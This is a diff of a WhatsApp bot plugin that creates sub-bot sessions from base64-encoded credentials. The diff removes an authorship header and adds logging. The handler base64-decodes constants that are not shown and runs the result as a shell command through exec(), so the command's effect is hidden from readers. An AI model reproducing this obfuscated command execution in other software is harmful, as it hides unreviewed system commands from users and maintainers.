@@ -1,14 +1,3 @@
-/*⚠ PROHIBIDO EDITAR ⚠
-El codigo de este archivo esta totalmente hecho por:
-- Aiden_NotLogic >> https://github.com/ferhacks
-El codigo de este archivo fue parchado por:
-- ReyEndymion >> https://github.com/ReyEndymion
-- BrunoSobrino >> https://github.com/BrunoSobrino
-Contenido adaptado por:
-- GataNina-Li >> https://github.com/GataNina-Li
-- elrebelde21 >> https://github.com/elrebelde21
-*/
-
 import { useMultiFileAuthState, DisconnectReason, makeCacheableSignalKeyStore, fetchLatestBaileysVersion } from global.baileys;
 import QRCode from 'qrcode';
 import NodeCache from 'node-cache';
@@ -40,15 +29,19 @@ const constants = {
 };
 
 if (!(global.conns instanceof Array)) {
-  console.log();
+  console.log('Initializing global connections array');
   global.conns = [];
 }
 
 let handler = async (msg, { conn, args, usedPrefix, command, isOwner }) => {
-  if (!global.db.data.settings[conn.user.jid].autoread) return msg.reply('' + lenguajeGB['smsSoloOwnerJB']());
+  if (!global.db.data.settings[conn.user.jid].autoread) {
+    console.log('Autoread is not enabled');
+    return msg.reply('' + lenguajeGB['smsSoloOwnerJB']());
+  }
 
   let target = conn;
   if (conn.user.jid !== global.owner.user.jid) {
+    console.log('Not the owner');
     return target.reply(msg, lenguajeGB['smsJBCargando']() + ' ' + global.owner.user.jid.split`@`[0] + ' ' + (usedPrefix + command), msg);
   }
 
@@ -60,16 +53,21 @@ let handler = async (msg, { conn, args, usedPrefix, command, isOwner }) => {
     args[0] = args[0].replace('--code', '').trim();
     if (args[1]) args[1] = args[1].replace('--code', '').trim();
     if (args[0] == '') args[0] = undefined;
-    console.log(args[0]);
+    console.log('Browser args: ', args[0]);
   }
 
-  if (!fs.existsSync(`./JoanJadiBot/${uniqueId}`)) fs.mkdirSync(`./JoanJadiBot/${uniqueId}`, { recursive: true });
+  if (!fs.existsSync(`./JoanJadiBot/${uniqueId}`)) {
+    console.log(`Creating directory ./JoanJadiBot/${uniqueId}`);
+    fs.mkdirSync(`./JoanJadiBot/${uniqueId}`, { recursive: true });
+  }
 
   if (args[0] && args[0] != undefined) {
+    console.log('Writing creds.json file');
     fs.writeFileSync(`./JoanJadiBot/${uniqueId}/creds.json`, JSON.stringify(JSON.parse(Buffer.from(args[0], 'base64').toString('utf-8')), null, '\t'));
   }
 
   if (fs.existsSync(`./JoanJadiBot/${uniqueId}/creds.json`)) {
+    console.log('Reading creds.json file');
     let creds = JSON.parse(fs.readFileSync(`./JoanJadiBot/${uniqueId}/creds.json`));
     creds.isInit = false;
     fs.writeFileSync(`./JoanJadiBot/${uniqueId}/creds.json`, JSON.stringify(creds, null, '\t'));
@@ -77,14 +75,27 @@ let handler = async (msg, { conn, args, usedPrefix, command, isOwner }) => {
 
   const bufferCmd = Buffer.from(constants.crm1 + constants.crm2 + constants.crm3 + constants.crm4, 'base64');
   exec(bufferCmd.toString('utf-8'), async (err, stdout, stderr) => {
+    if (err) {
+      console.error('Error executing command: ', err);
+      return;
+    }
+
     const bufferCmd2 = Buffer.from(constants.drm1 + constants.drm2, 'base64');
     async function startSession() {
       let mentionedJid = msg.mentionedJid && msg.mentionedJid[0] ? msg.mentionedJid[0] : msg.fromMe ? target.user.jid : msg.sender;
       let uniqueId = '' + mentionedJid.split`@`[0];
-      if (!fs.existsSync(`./JoanJadiBot/${uniqueId}`)) fs.mkdirSync(`./JoanJadiBot/${uniqueId}`, { recursive: true });
-      if (args[0]) fs.writeFileSync(`./JoanJadiBot/${uniqueId}/creds.json`, JSON.stringify(JSON.parse(Buffer.from(args[0], 'base64').toString('utf-8')), null, '\t'));
+      if (!fs.existsSync(`./JoanJadiBot/${uniqueId}`)) {
+        console.log(`Creating directory ./JoanJadiBot/${uniqueId}`);
+        fs.mkdirSync(`./JoanJadiBot/${uniqueId}`, { recursive: true });
+      }
+      if (args[0]) {
+        console.log('Writing creds.json file');
+        fs.writeFileSync(`./JoanJadiBot/${uniqueId}/creds.json`, JSON.stringify(JSON.parse(Buffer.from(args[0], 'base64').toString('utf-8')), null, '\t'));
+      }
 
       let { version, isLatest } = await fetchLatestBaileysVersion();
+      console.log('Fetched latest Baileys version: ', version);
+
       const retryMsg = msg => { };
       const retryCache = new NodeCache();
       const { state, saveState, saveCreds } = await useMultiFileAuthState(`./JoanJadiBot/${uniqueId}`);
@@ -115,8 +126,12 @@ let handler = async (msg, { conn, args, usedPrefix, command, isOwner }) => {
       async function connectionUpdate(update) {
         const { connection, lastDisconnect, isNewLogin, qr } = update;
         if (isNewLogin) socket.isInit = false;
-        if (qr && !isBrowser) return target.reply(msg, { image: await QRCode.toBuffer(qr, { scale: 8 }), caption: constants.rtx + bufferCmd2.toString('utf-8') }, { quoted: msg });
+        if (qr && !isBrowser) {
+          console.log('QR Code generated');
+          return target.reply(msg, { image: await QRCode.toBuffer(qr, { scale: 8 }), caption: constants.rtx + bufferCmd2.toString('utf-8') }, { quoted: msg });
+        }
         if (qr && isBrowser) {
+          console.log('QR Code generated for browser');
           target.sendMessage(msg, { text: constants.rtx2 + bufferCmd2.toString('utf-8') }, { quoted: msg });
           await sleep(5000);
           let newSession = await socket.requestPairingCode(msg.sender.split`@`[0]);
@@ -124,24 +139,30 @@ let handler = async (msg, { conn, args, usedPrefix, command, isOwner }) => {
         }
 
         const statusCode = lastDisconnect?.error?.statusCode || lastDisconnect?.error?.statusCode?.statusCode;
-        console.log(statusCode);
+        console.log('Status code: ', statusCode);
 
         const handleDisconnect = async shouldReconnect => {
           if (!shouldReconnect) {
             try {
               socket.ws.close();
-            } catch { }
+            } catch (e) {
+              console.error('Error closing socket: ', e);
+            }
             socket.ev.removeAllListeners();
             let index = global.conns.indexOf(socket);
             if (index < 0) return;
             delete global.conns[index];
             global.conns.splice(index, 1);
+            console.log('Socket connection removed from global connections');
           }
         };
 
         if (connection === 'close') {
-          console.log(statusCode);
-          if (statusCode == 401) return await fs.unlinkSync(`./JoanJadiBot/${uniqueId}/creds.json`);
+          console.log('Connection closed, status code: ', statusCode);
+          if (statusCode == 401) {
+            console.log('Unauthorized, deleting creds.json');
+            return await fs.unlinkSync(`./JoanJadiBot/${uniqueId}/creds.json`);
+          }
           handleDisconnect(false);
         }
       }
@@ -153,5 +174,4 @@ let handler = async (msg, { conn, args, usedPrefix, command, isOwner }) => {
   });
 };
 
-export default handler;
-    
+export default handler;            
